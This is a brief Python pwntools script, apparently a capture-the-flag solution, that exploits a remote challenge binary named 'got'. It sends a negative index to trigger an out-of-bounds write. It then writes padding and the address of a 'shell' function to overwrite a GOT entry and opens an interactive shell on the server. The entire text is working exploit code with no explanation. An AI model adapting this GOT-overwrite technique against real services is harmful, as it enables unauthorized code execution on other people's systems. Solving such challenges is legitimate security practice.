from pwn import *

context.log_level = "debug"

p = remote("got-b130222c894f611f.deploy.phreaks.fr", 443, ssl=True) #process("got")
e = ELF("got")

p.sendlineafter(b"> ", b"-4")

payload = b"a" * 0x8
payload += p64(e.symbols["shell"])

p.sendline(payload)

p.interactive()
